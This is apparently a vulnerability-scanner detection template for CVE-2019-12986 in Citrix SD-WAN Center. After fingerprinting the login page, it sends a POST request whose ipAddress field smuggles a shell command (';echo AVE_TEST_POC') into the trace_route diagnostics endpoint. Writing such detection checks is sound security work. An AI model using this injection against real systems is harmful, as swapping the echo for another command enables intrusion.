[info]
author = "AVE"
description = "通过向 /Collector/diagnostics/trace_route 发送特制 POST 请求，在 ipAddress 参数中注入系统命令，利用 OOB 方式检测命令执行。该漏洞源于 DiagnosticsController 的 trace_route 函数未对用户输入进行有效过滤，直接拼接至 shell 命令执行。"
id = "POC-AVE-2019-0059"
name = "Citrix SD-WAN Center 命令注入 PoC"
severity = "critical"
tags = ["ave-2019-0059"]
vuln_id = [
    "CVE-2019-12986",
    "AVE-2019-0059",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/login"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<title>Citrix SD-WAN</title>"]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/Collector/diagnostics/trace_route"
protocol = "http"

[poc.requests.body]
content = "ipAddress=;echo+AVE_TEST_POC&pingCount=1&packetSize=56"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AVE_TEST_POC"]
